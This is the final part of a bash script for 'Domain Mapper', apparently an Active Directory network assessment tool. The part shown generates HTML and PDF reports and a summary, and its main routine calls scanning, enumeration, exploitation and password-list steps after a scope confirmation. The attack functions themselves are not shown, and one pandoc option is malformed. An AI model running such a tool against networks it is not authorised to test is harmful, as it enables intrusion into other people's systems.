ensure_pdf_dependencies() {
  if command -v pandoc >/dev/null 2>&1 || command -v wkhtmltopdf >/dev/null 2>&1 || (command -v enscript >/dev/null 2>&1 && command -v ps2pdf >/dev/null 2>&1); then
    return 0
  fi

  log_info "No PDF generator found. Attempting automatic installation (enscript & ghostscript)..."
  if command -v apt-get >/dev/null 2>&1; then
    apt-get update -y >/dev/null 2>&1 || true
    apt-get install -y enscript ghostscript >/dev/null 2>&1 || true
  fi
}

clean_ansi() {
  sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g"
}

generate_html_report() {
  local html_file="$1"

  cat <<EOF > "$html_file"
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Domain Mapper - Security Report</title>
  <style>
    @page { size: A4; margin: 15mm; }
    body { font-family: 'Segoe UI', Tahoma, Arial, sans-serif; color: #2c3e50; line-height: 1.5; font-size: 10pt; direction: ltr; text-align: left; }
    .header { border-bottom: 2px solid #34495e; padding-bottom: 8px; margin-bottom: 15px; }
    .header h1 { margin: 0; color: #1a252f; font-size: 20pt; }
    .header .subtitle { color: #7f8c8d; font-size: 9pt; text-transform: uppercase; }
    .meta-grid { display: table; width: 100%; background: #f8f9fa; border: 1px solid #e9ecef; padding: 8px; margin-bottom: 15px; border-radius: 4px; }
    .meta-row { display: table-row; }
    .meta-cell { display: table-cell; padding: 4px 8px; font-size: 9pt; }
    .meta-label { font-weight: bold; color: #495057; width: 20%; }
    h2 { color: #2c3e50; border-bottom: 1px solid #dee2e6; padding-bottom: 3px; margin-top: 15px; font-size: 12pt; }
    pre { background: #f8f9fa; border: 1px solid #e9ecef; border-radius: 3px; padding: 8px; font-family: 'Consolas', 'Courier New', monospace; font-size: 8pt; white-space: pre-wrap; word-break: break-all; }
  </style>
</head>
<body>

  <div class="header">
    <h1>Domain Mapper Executive Report</h1>
    <div class="subtitle">Network Security Assessment</div>
  </div>

  <div class="meta-grid">
    <div class="meta-row">
      <div class="meta-cell meta-label">Generated:</div>
      <div class="meta-cell">$(timestamp)</div>
      <div class="meta-cell meta-label">Target Range:</div>
      <div class="meta-cell"><code>$TARGET_RANGE</code></div>
    </div>
    <div class="meta-row">
      <div class="meta-cell meta-label">Domain:</div>
      <div class="meta-cell">$DOMAIN_NAME (Detected: ${DETECTED_DOMAIN:-N/A})</div>
      <div class="meta-cell meta-label">Levels (S/E/X):</div>
      <div class="meta-cell">$SCAN_LEVEL / $ENUM_LEVEL / $EXPLOIT_LEVEL</div>
    </div>
  </div>

  <h2>Report Findings & Summaries</h2>
  <pre>$(html_escape_report | clean_ansi)</pre>

</body>
</html>
EOF
}

# Try supported local PDF generation paths in assignment-preferred order. When
# no PDF can be produced, append a clear reason to the text report.
generate_pdf_report() {
  ensure_pdf_dependencies

  local html_path="$REPORTS_DIR/report.html"

  log_info "Generating structured HTML for PDF rendering."
  generate_html_report "$html_path"

  if command -v wkhtmltopdf >/dev/null 2>&1; then
    if wkhtmltopdf --enable-local-file-access --page-size A4 --margin-top 15mm --margin-bottom 15mm "$html_path" "$REPORT_PDF" >/dev/null 2>&1; then
      log_ok "PDF report successfully saved with wkhtmltopdf: $REPORT_PDF"
      return 0
    fi
    PDF_UNAVAILABLE_REASON="wkhtmltopdf failed to compile PDF"
  fi

  if command -v weasyprint >/dev/null 2>&1; then
    if weasyprint "$html_path" "$REPORT_PDF" >/dev/null 2>&1; then
      log_ok "PDF report successfully saved with WeasyPrint: $REPORT_PDF"
      return 0
    fi
  fi

  if command -v pandoc >/dev/null 2>&1; then
    if pandoc "$REPORT_TXT" -o "$REPORT_PDF" --pdf-engine=pdf-engine 2>/dev/null; then
      log_ok "PDF report saved with pandoc: $REPORT_PDF"
      return 0
    fi
  fi

  PDF_UNAVAILABLE_REASON="No suitable HTML-to-PDF converter (wkhtmltopdf/weasyprint) completed successfully."
  REPORT_PDF=""
  append_pdf_unavailable_section "$PDF_UNAVAILABLE_REASON"
  log_warn "PDF generation failed. Text report available at $REPORT_TXT"
}

print_final_summary() {
  local hosts_up_count="0"
  local possible_dc="none detected"
  local vulnerability_findings="not run"

  if [[ -s "$PARSED_DIR/hosts_up.txt" ]]; then
    hosts_up_count="$(awk 'NF { count++ } END { print count + 0 }' "$PARSED_DIR/hosts_up.txt")"
  fi
  if [[ -s "$PARSED_DIR/possible_domain_controllers.txt" ]]; then
    possible_dc="$(grep -E '\| (High|Medium) confidence \|' "$PARSED_DIR/possible_domain_controllers.txt" | head -n 1 || true)"
    if [[ -z "$possible_dc" ]]; then
      possible_dc="none high-confidence found"
    fi
  fi
  if [[ -f "$RAW_DIR/exploit_basic_nmap_vuln.txt" && -f "$PARSED_DIR/vuln_summary.txt" ]]; then
    if grep -q '^High-risk findings found: yes$' "$PARSED_DIR/vuln_summary.txt"; then
      vulnerability_findings="high-risk findings found"
    elif grep -q '^Vulnerability findings found: yes$' "$PARSED_DIR/vuln_summary.txt"; then
      vulnerability_findings="findings found"
    else
      vulnerability_findings="none found"
    fi
  fi

  printf '\n%s\n' "$(label "$COLOR_BOLD" "Summary")"
  printf '%s\n' "-------"
  printf 'Target              %s\n' "$TARGET_RANGE"
  printf 'Input domain        %s\n' "${INPUT_DOMAIN:-not provided}"
  printf 'Domain provided     %s\n' "$DOMAIN_PROVIDED"
  printf 'Internal domain     %s\n' "$DOMAIN_NAME"
  printf 'Detected domain     %s\n' "${DETECTED_DOMAIN:-not detected}"
  printf 'Scanning            %s\n' "$SCAN_LEVEL"
  printf 'Enumeration         %s\n' "$ENUM_LEVEL"
  printf 'Exploitation        %s\n' "$EXPLOIT_LEVEL"
  printf 'Hosts up            %s\n' "$hosts_up_count"
  printf 'Possible DC         %s\n' "$possible_dc"
  printf 'Vulnerabilities     %s\n' "$vulnerability_findings"
  printf 'Session             %s\n' "$SESSION_DIR"
  printf 'Text report         %s\n' "$REPORT_TXT"
  if [[ -n "${REPORT_PDF:-}" && -f "$REPORT_PDF" ]]; then
    printf 'PDF report          %s\n' "$REPORT_PDF"
  else
    printf 'PDF report          not created\n'
    printf 'PDF reason          %s\n' "${PDF_UNAVAILABLE_REASON:-PDF generation was not completed.}"
  fi
  printf '\n'
}

main() {
  setup_colors

  if [[ "${1:-}" == "-h" || "${1:-}" == "--help" ]]; then
    show_help
    exit 0
  fi

  if [[ "$#" -gt 0 ]]; then
    die "Unsupported argument: $1. Use -h or --help."
  fi

  preflight_checks
  print_banner
  prompt_inputs
  confirm_authorized_scope
  create_session_dir
  record_tool_availability

  log_info "Starting Domain Mapper."
  log_info "Target range: $TARGET_RANGE"
  log_info "Domain name: $DOMAIN_NAME"
  log_info "AD username provided: $(if [[ -n "$AD_USERNAME" ]]; then printf 'yes'; else printf 'no'; fi)"
  log_info "AD password provided: $(if [[ -n "$AD_PASSWORD" ]]; then printf 'yes'; else printf 'no'; fi)"
  log_info "Password list path: $PASSWORD_LIST"

  run_scanning
  run_enumeration
  run_exploitation
  generate_text_report
  generate_pdf_report

  log_ok "Domain Mapper finished."
  print_final_summary
}

main "$@"